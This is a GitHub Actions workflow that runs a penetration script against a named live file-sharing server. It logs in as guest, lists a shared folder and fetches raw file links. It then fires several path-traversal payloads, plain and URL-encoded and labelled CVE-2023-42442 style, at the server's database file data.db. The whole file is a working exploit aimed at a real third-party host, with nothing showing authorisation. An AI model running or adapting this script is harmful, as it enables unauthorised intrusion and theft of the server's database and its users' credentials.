name: openlist-pt3
on:
  workflow_dispatch:
jobs:
  pt3:
    runs-on: ubuntu-latest
    steps:
      - name: prove get_raw mechanism on a real shared file, then re-test traversal relative to subfolder
        run: |
          set +e
          B="https://pan.yazinb.icu"
          TOKEN=$(curl -skS -m20 -X POST "$B/api/auth/login" -H "Content-Type: application/json" -d '{"username":"guest","password":"guest"}' | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('data',{}).get('token',''))")
          echo "guest_token_len=${#TOKEN}"; export TOKEN
          get_raw () { curl -skS -m30 -X POST "$B/api/fs/get" -H "Authorization: $TOKEN" -H "Content-Type: application/json" -d "{\"path\":\"$1\"}" | python3 -c "import sys,json;d=json.load(sys.stdin);print((d.get('data') or {}).get('raw_url','')) if d else 'NODATA'" 2>/dev/null; }
          # descend one known folder to a real file
          SUB="Artex 直装包 渗透网站专用"
          echo "--- list /$SUB (first 3) ---"
          curl -skS -m30 -X POST "$B/api/fs/list" -H "Authorization: $TOKEN" -H "Content-Type: application/json" -d "{\"path\":\"/$SUB\",\"per_page\":5}" \
            | python3 -c "import sys,json;d=json.load(sys.stdin);[print('  ',c.get('name'),'type=',c.get('type')) for c in d.get('data',{}).get('content',[])[:5]]" 2>/dev/null
          # find first FILE (type 0)
          F=$(curl -skS -m30 -X POST "$B/api/fs/list" -H "Authorization: $TOKEN" -H "Content-Type: application/json" -d "{\"path\":\"/$SUB\",\"per_page\":100}" \
            | python3 -c "import sys,json;d=json.load(sys.stdin);c=d.get('data',{}).get('content',[]);f=[x for x in c if x.get('type')==0];print(f[0]['name'] if f else '')" 2>/dev/null)
          echo "REAL_FILE_IN_SUB=[$F]"
          if [ -n "$F" ]; then
            ru=$(get_raw "/$SUB/$F")
            echo "REALFILE raw_url=[$ru]  -> MECHANISM $([ -n "$ru" ] && echo WORKS || echo BROKEN)"
          fi
          # traversal relative to subfolder path (CVE-2023-42442 style from within storage)
          echo "--- traversal variants (relative to storage root) ---"
          for p in \
            "/$SUB/../../../../var/lib/openlist/data.db" \
            "/$SUB/../var/lib/openlist/data.db" \
            "../../../../var/lib/openlist/data.db" \
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fvar%2flib%2fopenlist%2fdata.db" ; do
            echo "=== [$p] ==="; echo "  raw_url=[$(get_raw "$p")]"
          done
          echo "=== DONE ==="
